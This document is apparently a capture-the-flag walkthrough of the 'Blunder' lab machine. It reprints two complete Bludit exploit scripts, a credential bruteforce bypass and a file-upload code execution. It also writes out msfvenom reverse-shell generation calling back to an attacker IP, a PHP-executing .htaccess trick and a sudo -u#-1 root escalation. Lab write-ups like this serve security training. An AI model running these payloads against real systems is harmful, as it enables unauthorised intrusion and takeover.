#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 09:01 CDT
Nmap scan report for 10.10.10.191
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: Linux 5.0 (94%), Linux 5.0 - 5.4 (94%), Linux 5.4 (92%), HP P2000 G3 NAS device (91%), Linux 4.15 - 5.6 (91%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.03 ms 10.10.14.1
2   100.06 ms 10.10.10.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
```
#enumeration 
we only had port 80 so ran gobuster
```
/about                (Status: 200) [Size: 3281]
/0                    (Status: 200) [Size: 7562]
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/robots.txt           (Status: 200) [Size: 22]                                
/todo.txt             (Status: 200) [Size: 118]                               
/usb                  (Status: 200) [Size: 3960]                              
/LICENSE              (Status: 200) [Size: 1083] 
```
in todo.txt we got a user fergus
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
admin page was a login page with buldit running
in searchsploit 
```
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit) | php/remote/47699.rb
Bludit 3.9.12 - Directory Traversal                         | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                       | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                          | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload           | php/webapps/46060.txt
------------------------------------------------------------ ---------------------------------
```
there was a authentication bruteforce bypass python script
Reading the script it was a cred bruteforce script 
so created a txt file with user fergus
and in password list tried rockyou
but it was not working
There was no wrong with the script but maybe with the password list
tried some common names in seclist but didn't work then after sometime I realised that there might be a customised wordlist(also with help of my friend v1per).Tried making one with cewl 
```cewl http://10.10.10.191 > pass.txt```
then ran the script
***BLUDIT-CRED Bruteforce**
```
!/usr/bin/python3

# Exploit
## Title: Bludit <= 3.9.2 - Bruteforce Mitigation Bypass
## Author: ColdFusionX (Mayank Deshmukh)
## Author website: https://coldfusionx.github.io
## Date: 2020-10-19
## Vendor Homepage: https://www.bludit.com/
## Software Link: https://github.com/bludit/bludit/archive/3.9.2.tar.gz
## Version: <= 3.9.2

# Vulnerability
## Discoverer: Rastating
## Discoverer website: https://rastating.github.io/
## CVE: CVE-2019-17240 https://nvd.nist.gov/vuln/detail/CVE-2019-17240
## References: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
## Patch: https://github.com/bludit/bludit/pull/1090

'''
Example Usage:
- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt 
'''

import requests
import sys
import re
import argparse, textwrap
from pwn import *

#Expected Arguments
parser = argparse.ArgumentParser(description="Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass", formatter_class=argparse.RawTextHelpFormatter, 
epilog=textwrap.dedent(''' 
Exploit Usage : 
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''))                     

parser.add_argument("-l","--url", help="Path to Bludit (Example: http://127.0.0.1/admin/login.php)") 
parser.add_argument("-u","--userlist", help="Username Dictionary") 
parser.add_argument("-p","--passlist", help="Password Dictionary")    
args = parser.parse_args()

if len(sys.argv) < 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")          
    sys.exit(1)  

# Variable
LoginPage = args.url
Username_list = args.userlist
Password_list = args.passlist

log.info('Bludit Auth BF Mitigation Bypass Script by ColdFusionX \n ')

def login(Username,Password):
    session = requests.session()          
    r = session.get(LoginPage)
 
# Progress Check    
    process = log.progress('Brute Force')

#Getting CSRF token value
    CSRF = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)
    CSRF = CSRF.group(1)

#Specifying Headers Value
    headerscontent = {
    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Referer' : f"{LoginPage}",
    'X-Forwarded-For' : f"{Password}"
    }

#POST REQ data
    postreqcontent = {
    'tokenCSRF' : f"{CSRF}",
    'username' : f"{Username}",
    'password' : f"{Password}"
    }

#Sending POST REQ
    r = session.post(LoginPage, data = postreqcontent, headers = headerscontent, allow_redirects= False)

#Printing Username:Password            
    process.status('Testing -> {U}:{P}'.format(U = Username, P = Password))            

#Conditional loops    
    if 'Location' in r.headers:
        if "/admin/dashboard" in r.headers['Location']:
            print()
            log.info(f'SUCCESS !!')
            log.success(f"Use Credential -> {Username}:{Password}")
            sys.exit(0)
    elif "has been blocked" in r.text:
        log.failure(f"{Password} - Word BLOCKED")
        
#Reading User.txt & Pass.txt files
userfile = open(Username_list).readlines()
for Username in userfile:
    Username = Username.strip() 
   
passfile = open(Password_list).readlines()
for Password in passfile:
    Password = Password.strip()   
    login(Username,Password) 
```
ran it like this:
```
python3 48942.py --url http://10.10.10.191/admin/login/ -u user.txt -p pass.txt
```
we got our creds
```fergus:RolandDeschain```
#reverseshell 
searching for bluditexploits I found something for msfconsole
**Bludit Directory Traversal Image File Upload Vulnerability**
but I avoided using it so started seaching again and i got this:
**Bludit v3.9.2 Code Execution Vulnerability in "Upload function" #1081**
link:https://www.exploit-db.com/exploits/48701
changed the script a bit
```
# Title: Bludit 3.9.2 - Directory Traversal
# Author: James Green
# Date: 2020-07-20
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Linux Ubuntu 19.10 Eoan
# CVE: CVE-2019-16113
# 
# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699

#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png

#!/usr/bin/env python3

import requests
import re
import argparse
import random
import string
import base64
from requests.exceptions import Timeout

url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil.png
# echo -e "<?php $(cat evil.png)" > evil.png 
payload = 'evil.png'  # CREATE ME

# echo "RewriteEngine off" > .htaccess
# echo "AddType application/x-httpd-php .png" >> .htaccess
payload2 = '.htaccess'  # CREATE ME

def login(url,username,password):
    """ Log in with provided admin creds, grab the cookie once authenticated """

    session = requests.Session()
    login_page = session.get(url + "/admin/")
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',
                           login_page.text
                 ).group(1)
    cookie = ((login_page.headers["Set-Cookie"]).split(";")[0].split("=")[1])
    data = {"save":"",
            "password":password,
            "tokenCSRF":csrf_token,
            "username":username}
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer": url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
               "Content-Type":"application/x-www-form-urlencoded"
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/",
                            data=data,
                            headers=headers,
                            cookies=cookies,
                            allow_redirects = False
               )

    print("cookie: " + cookie)
    return cookie

def get_csrf_token(url,cookie):
    """ Grab the CSRF token from an authed session """

    session = requests.Session()
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate"}
    cookies = {"BLUDIT-KEY":cookie}
    response = session.get(url + "/admin/dashboard",
                           headers=headers,
                           cookies=cookies
               )
    csrf_token = response.text.split('var tokenCSRF = "')[1].split('"')[0]

    print("csrf_token: " + csrf_token)
    return csrf_token

def upload_evil_image(url, cookie, csrf_token, payload, override_uuid=False):
    """ Upload files required for to execute PHP from malicious image files. Payload and .htaccess """

    session = requests.Session()
    files= {"images[]": (payload,
                         open(payload, "rb"),
                         "multipart/form-data",
                         {"Content-Type": "image/png", "filename":payload}
                        )}
    if override_uuid:
        data = {"uuid": "../../tmp/temp",
                "tokenCSRF":csrf_token}
    else:
        # On the vuln app, this line occurs first:
        # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
        # Even though there is a file extension check, it won't really stop us
        # from uploading the .htaccess file.
        data = {"tokenCSRF":csrf_token}
    headers = {"Origin":url,
               "Accept":"*/*",
               "X-Requested-With":"XMLHttpRequest",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/new-content",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/ajax/upload-images", data=data, files=files, headers=headers, cookies=cookies)
    print("Uploading payload: " + payload)

if __name__ == "__main__":
    cookie = login(url, username, password)
    token = get_csrf_token(url, cookie)
    upload_evil_image(url, cookie, token, payload, True)
    upload_evil_image(url, cookie, token, payload2)
```
reading the script found that we had  to create a .htaccess file
```
 echo "RewriteEngine off" > .htaccess
 echo "AddType application/x-httpd-php .png" >> .htaccess
```
and also a php payload with png extension
```
msfvenom -p php/reverse_php LHOST=10.10.14.10 LPORT=1234 -f raw > evil.png

echo -e "<?php $(cat evil.png)" > evil.png
```
Now ran the script the file got uploaded to
http://10.10.10.191/bl-content/tmp/temp/evil.png

and in our terminal we listen with nc to get the www-data shell

#priviledge-escalation 
Do use ```rlwrap nc -lnvp 1234```
otherwise you are doomed and ur terminal  willl be apparently doing nothing not even ls

Now we had user hugo and shaun
Now while checking the /var/www
I found two version of bludit
```bludit-3.10.0a & bludit-3.9.2```
The one we exploited was 3.9.2 so let's check the otherone
there I got a users.php file in /var/www/bludit-3.10.0a/bl-content/databases and we had 
```
"nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
```
hash for user hugo
appears crackable
and used crackstation to crack it
**Password120**
Now escalated to hugo with su using the password
#rootescalation 
now do sudo -l
```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
Now escalation for sudo bash is allowed for all user except root
Now I remember we had done something like this but I didn't remember what we didi exactly so I googled
and got this https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
Now i remembered we have to run sudo with user id -1
```sudo -u#-1 /bin/bash```
and we are root 
